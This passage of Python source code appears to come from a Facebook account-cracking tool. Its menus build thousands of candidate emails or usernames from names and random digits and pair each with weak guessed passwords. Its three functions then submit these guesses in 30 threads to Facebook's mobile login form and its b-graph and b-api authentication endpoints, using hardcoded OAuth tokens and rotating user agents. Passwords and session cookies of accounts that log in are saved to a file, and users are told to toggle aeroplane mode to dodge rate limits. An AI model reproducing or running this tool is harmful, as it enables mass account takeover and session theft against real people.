			if mxt in ['B',"2","b"]:
				tonxoys.submit(graphrm,id,psd,tid)
			elif mxt in ['C',"3","c"]:
				tonxoys.submit(apirm,id,psd,tid)
############------[RANDOM GMAIL SYSTEM]-------#########
def menu3():
	logo()
	print(f'{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W} ');line()
	frs=input(f'{W}[{G}+{E}] Fast Name : {G}');print(f"{W}{40*'='}")
	print(f'{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}');line()
	lst=input(f'{W}[{G}+{E}] Last Name : {G}');print(f"{W}{40*'='}");print(f'{W}EXAMPLE: {G}500{W},{G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{40*'='}")
	print(f'{W}EXAMPLE : {G}@gmail.com{W} , {G}@yahoo.com{W} {R}ETC{G}...{W}');line()
	dmn=input(f'{W}[{G}+{E}] Domain : {G}')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'[{G}+{W}] Choose: {G}')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'{W}[{G}+{W}] Choose: {G}')
	if psdgg in ['B',"2","b"]:
		print(f"{W}{40*'='}");passx = int(input(f"[{G}+{W}] Enter Password Limit : {G}"))
		for dhhh in range(passx):
			print(f"{W}{40*'='}");print(f"{W}Don't try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ")
			print(f'{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W} ')
			print(f"{W}{40*'='}");pww = input(f"[{G}+{W}] Enter Password : {G}First+")
			paswtrh.append(pww)
	else:
		pww =str(0)
		paswtrh.append(pww)
	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
	lxtx = ['1','2','4','5','6','7','8','9']
	for gmnu in range(limit):
		lcxt = random.choice(lxtx)
		if '1' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,2))
			xode.append(digx)
		if '2' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,3))
			xode.append(digx)
		if '4' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,5))
			xode.append(digx)
		if '5' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,6))
			xode.append(digx)
		if '6' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,7))
			xode.append(digx)
		if '7' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,8))
			xode.append(digx)
		if '8' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,9))
			xode.append(digx)
		if '9' in lcxt:
			digx = ''.join(random.choice(string.digits) for _ in range(1,10))
			xode.append(digx)
		else:
			digx = ''.join(random.choice(string.digits) for _ in range(1,4))
			xode.append(digx)
	with ThreadPool(max_workers=30) as tonxoys:
		tid= str(len(xode))
		logo();print (f' {W}[{G}•{W}] {W}DOMAIN : \033[1;92m'+dmn);print(f'{W} [{G}•{W}] TOTAL ID :{G} '+tid);print (f' {W}[{G}•{W}] \033[1;97mFULL NAME : \033[1;92m'+frs+" "+lst);print(f' {W}[{G}•{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=frs+lst+rngx+dmn
			psd=[frs+lst,frs+" "+lst,frs+"123",frs+"1234",frs+"12345",frs+"@",frs+"@@",frs+"@@@",frs+"@@##"]
			for thdhy in paswtrh:
				psd.append(frs+thdhy)
			if mxt in ['A','1',"a"]:
				tonxoys.submit(nrmlrm,id,psd,tid,"m.facebook.com")
			if mxt in ['B',"2","b"]:
				tonxoys.submit(graphrm,id,psd,tid)
			elif mxt in ['C',"3","c"]:
				tonxoys.submit(apirm,id,psd,tid)
			
############------[RANDOM USN SYSTEM]-------#########
def menu4():
	logo()
	print(f'{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W} ');line()
	frs=input(f'{W}[{G}+{E}] Fast Name : {G}');print(f"{W}{40*'='}")
	print(f'{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}');line()
	lst=input(f'{W}[{G}+{E}] Last Name : {G}');print(f"{W}{40*'='}");print(f'{W}EXAMPLE: {G}500{W},{G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{40*'='}")
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'[{G}+{W}] Choose: {G}')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'{W}[{G}+{W}] Choose: {G}')
	if psdgg in ['B',"2","b"]:
		print(f"{W}{40*'='}");passx = int(input(f"[{S}+{W}] Enter Password Limit : "))
		for dhhh in range(passx):
			print(f"{W}{40*'='}");print(f"{W}Don't try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ")
			print(f'{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W} ')
			print(f"{W}{40*'='}");pww = input(f"[{G}+{W}] Enter Password : {G}First+")
			paswtrh.append(pww)
	else:
		pww =str(0)
		paswtrh.append(pww)
	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
	for gmnu in range(limit):
		digx = ''.join(random.choice(string.digits) for _ in range(1,4))
		xode.append(digx)
	with ThreadPool(max_workers=30) as tonxoys:
		tid= str(len(xode))
		logo();print(f'{W} [{G}•{W}] TOTAL ID :{G} '+tid);print (f' {W}[{G}•{W}] \033[1;97mFULL NAME : \033[1;92m'+frs+" "+lst);print(f' {W}[{G}•{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=frs+lst+rngx
			psd=[frs+lst,frs+" "+lst,frs+"123",lst+"123",frs+"12345",frs+"@",frs+lst+"123",frs+"@@"]
			for thdhy in paswtrh:
				psd.append(frs+thdhy)
			if mxt in ['A','1',"a"]:
				tonxoys.submit(nrmlrm,id,psd,tid,"m.facebook.com")
			if mxt in ['B',"2","b"]:
				tonxoys.submit(graphrm,id,psd,tid)
			elif mxt in ['C',"3","c"]:
				tonxoys.submit(apirm,id,psd,tid)

############------[RANDOM METHOD SYSTEM]-------#########
def nrmlrm(id,psd,tid,mytd):
	global ok,cp,lop
	session = requests.Session()
	ua=random.choice(ugen)
	for psw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}TKM-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		ffb = session.get(f'https://'+mytd).text
		datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
		header={'authority': mytd,'method': 'GET','path': '/','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',  'cache-control': 'max-age=0',    'sec-ch-prefers-color-scheme': 'light',   'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"', 'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"', 'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
		lo = session.post(f'https://{mytd}/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
		lcki=session.Cookie.get_dict().keys()
		if 'c_user' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[151:166]
			print(f'\r\r{G}[TKM-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[TKM-CP] {iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
def graphrm(id,psd,tid):
	global ok,cp,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}TKM-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		ua=random.choice(ugen)
		#ua='[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_Cookie': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': ua1(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_Cookie"]
			ck={}
			for xk in cki:
				ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r{G}[TKM-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{S}[TKM-2F] {iid} | {psw}{W}')
			open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r{R}[TKM-CP] {iid} | {psw}{W}')
					
				cp.append(id)
				open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
				break
		else:continue
	lop+=1
def apirm(id,psd,tid):
	global ok,cp,lop
	ton=[]
	sys.stdout.write(f'\r\r{BG}[{W}TKM-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		url = 'https://b-api.facebook.com/method/auth.login'
		gtt=random.choice(gtxx)
		ua="[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
		dataxx={'adid':str(uuid.uuid4()), 'email':id, 'password':psw,'cpl':'true', 'credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled', 'source':'login','format':'json', 'generate_session_Cookie':'1','generate_analytics_claim':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'device':gtt,'device_id':str(uuid.uuid4()), "method": "auth.login","fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
		header={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','api_key': '8114af471d039628db5c68cb127af936','user-agent':ua1(),'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
		datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_Cookie':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
		lo = requests.post(url,data=datax,headers=header,allow_redirects=False).text
		jsn = json.loads(lo)
		if 'session_key' in jsn:
			print(f'\r\r{G}[TKM-OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[TKM-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/TKM-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
def menu5():
	logo()
Main()
